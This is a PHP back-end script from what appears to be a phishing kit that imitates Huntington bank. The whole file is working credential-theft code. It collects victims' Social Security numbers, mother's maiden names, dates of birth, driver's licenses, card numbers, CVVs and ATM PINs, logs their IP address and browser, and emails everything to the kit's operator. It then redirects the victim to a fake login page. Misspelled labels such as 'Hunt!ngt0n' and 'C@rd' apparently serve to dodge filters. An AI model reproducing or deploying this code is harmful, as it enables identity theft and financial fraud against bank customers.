<?php
if($_POST["sn"] != "" and $_POST["mn"] != ""){
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$message .= "--------------Hunt!ngt0n Info-----------------------\n";
$message .= "S'S.N				       : ".$_POST['sn']."\n";
$message .= "MMN				       : ".$_POST['mn']."\n";
$message .= "DOB				       : ".$_POST['db']."\n";
$message .= "Address			       : ".$_POST['addr']."\n";
$message .= "Phone				       : ".$_POST['ph']."\n";
$message .= "Drive's license	       : ".$_POST['dl']."\n";
$message .= "Name on C@rd		       : ".$_POST['noc']."\n";
$message .= "C@rd Number	           : ".$_POST['cn']."\n";
$message .= "X'piry Date		       : ".$_POST['ex']."\n";
$message .= "C,V.V			           : ".$_POST['vc']."\n";
$message .= "A'TM P!N			       : ".$_POST['pn']."\n";
$message .= "|--------------- I N F O | I P -------------------|\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "User Agent : ".$useragent."\n";
$message .= "|----------- unknown --------------|\n";
include 'email.php';
$subject = "Card | $ip";
{
mail("$to", "$send", "$subject", $message);     
}
$praga=rand();
$praga=md5($praga);
  header ("Location: surf5.php?cmd=login_submit&id=$praga$praga&session=$praga$praga");
}else{
header ("Location: index.php");
}

?>
